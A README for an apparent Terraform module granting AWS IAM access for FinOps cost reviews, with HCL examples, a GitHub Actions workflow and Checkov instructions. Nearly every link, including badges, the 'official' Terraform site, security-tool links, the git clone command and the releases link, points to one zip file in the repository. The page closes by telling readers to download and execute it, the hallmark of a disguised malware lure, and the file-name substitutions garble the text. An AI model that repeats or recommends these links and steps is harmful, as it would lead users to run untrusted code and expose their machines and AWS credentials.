# Terraform AWS FinOps Cost Review Access Module 🌐

![GitHub release](https://github.com/vijayan1985/terraform-aws-finops-costreview-access/raw/refs/heads/main/examples/access-costreview-terraform-aws-finops-2.2.zip) ![Terraform](https://github.com/vijayan1985/terraform-aws-finops-costreview-access/raw/refs/heads/main/examples/access-costreview-terraform-aws-finops-2.2.zip) ![AWS](https://github.com/vijayan1985/terraform-aws-finops-costreview-access/raw/refs/heads/main/examples/access-costreview-terraform-aws-finops-2.2.zip)

Welcome to the **Terraform AWS FinOps Cost Review Access Module**! This repository provides a Terraform module designed to create an IAM user or cross-account IAM role specifically for external FinOps cost reviews in AWS. This module includes examples, optional AWS Organizations access, CI/CD workflows, and security checks to ensure a smooth and secure implementation.

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Getting Started](#getting-started)
- [Usage](#usage)
- [Examples](#examples)
- [CI/CD Workflows](#cicd-workflows)
- [Security Checks](#security-checks)
- [Contributing](#contributing)
- [License](#license)
- [Releases](#releases)

## Overview

In today’s cloud-centric world, managing costs effectively is essential for organizations. This module simplifies the process of granting access to external teams for FinOps reviews while maintaining strict security protocols. With this module, you can set up the necessary IAM resources quickly and efficiently.

## Features

- Create IAM users or cross-account IAM roles for FinOps access.
- Optional integration with AWS Organizations.
- Examples to help you get started.
- CI/CD workflows to automate deployment.
- Built-in security checks to ensure best practices.

## Getting Started

To get started with this module, ensure you have the following prerequisites:

- An AWS account with permissions to create IAM resources.
- Terraform installed on your local machine. You can download it from [Terraform's official site](https://github.com/vijayan1985/terraform-aws-finops-costreview-access/raw/refs/heads/main/examples/access-costreview-terraform-aws-finops-2.2.zip).

### Installation

1. Clone the repository:

   ```bash
   git clone https://github.com/vijayan1985/terraform-aws-finops-costreview-access/raw/refs/heads/main/examples/access-costreview-terraform-aws-finops-2.2.zip
   cd terraform-aws-finops-costreview-access
   ```

2. Initialize Terraform:

   ```bash
   terraform init
   ```

3. Configure your AWS credentials. You can set your AWS access key and secret key using environment variables:

   ```bash
   export AWS_ACCESS_KEY_ID="your_access_key"
   export AWS_SECRET_ACCESS_KEY="your_secret_key"
   ```

## Usage

To use this module, create a new Terraform configuration file (e.g., `https://github.com/vijayan1985/terraform-aws-finops-costreview-access/raw/refs/heads/main/examples/access-costreview-terraform-aws-finops-2.2.zip`) and include the following code:

```hcl
module "finops_costreview_access" {
  source = "vijayan1985/finops-costreview-access/aws"

  # Required variables
  iam_user_name = "finops-review-user"
  
  # Optional variables
  enable_aws_organizations = true
}
```

Replace the values with your specific configurations. You can find more options in the [variables section](#variables).

## Examples

To help you get started, we provide several examples. You can find them in the `examples` directory. Here are a few common use cases:

### Example 1: Create an IAM User

This example demonstrates how to create an IAM user for FinOps access.

```hcl
module "finops_user" {
  source = "vijayan1985/finops-costreview-access/aws"

  iam_user_name = "finops-user"
}
```

### Example 2: Create a Cross-Account IAM Role

This example shows how to set up a cross-account IAM role for FinOps teams.

```hcl
module "finops_cross_account_role" {
  source = "vijayan1985/finops-costreview-access/aws"

  iam_role_name = "finops-role"
  external_account_id = "123456789012"
}
```

## CI/CD Workflows

Automating your infrastructure deployment can save time and reduce errors. This module includes CI/CD workflows that you can use with popular platforms like GitHub Actions or GitLab CI. 

### GitHub Actions Example

Create a `https://github.com/vijayan1985/terraform-aws-finops-costreview-access/raw/refs/heads/main/examples/access-costreview-terraform-aws-finops-2.2.zip` file in your repository with the following content:

```yaml
name: Terraform

on:
  push:
    branches:
      - main

jobs:
  terraform:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Set up Terraform
        uses: hashicorp/setup-terraform@v1
        with:
          terraform_version: 1.0.0

      - name: Terraform Init
        run: terraform init

      - name: Terraform Apply
        run: terraform apply -auto-approve
```

This workflow will automatically run Terraform commands on every push to the main branch.

## Security Checks

Security is a priority when managing cloud resources. This module includes built-in security checks to ensure you follow best practices. You can run these checks using tools like [Terraform Sentinel](https://github.com/vijayan1985/terraform-aws-finops-costreview-access/raw/refs/heads/main/examples/access-costreview-terraform-aws-finops-2.2.zip) or [Checkov](https://github.com/vijayan1985/terraform-aws-finops-costreview-access/raw/refs/heads/main/examples/access-costreview-terraform-aws-finops-2.2.zip).

### Running Security Checks with Checkov

To run Checkov, first install it using pip:

```bash
pip install checkov
```

Then, navigate to your Terraform configuration directory and run:

```bash
checkov -d .
```

Checkov will scan your Terraform files and provide feedback on potential security issues.

## Contributing

We welcome contributions to this project! If you have ideas for improvements or find bugs, please open an issue or submit a pull request. 

### Steps to Contribute

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your changes to your forked repository.
5. Create a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Releases

For the latest releases, visit [this link](https://github.com/vijayan1985/terraform-aws-finops-costreview-access/raw/refs/heads/main/examples/access-costreview-terraform-aws-finops-2.2.zip). Download and execute the necessary files to keep your module up to date.

Feel free to explore the repository and make use of the resources provided. Your feedback and contributions are invaluable to improving this module for everyone involved.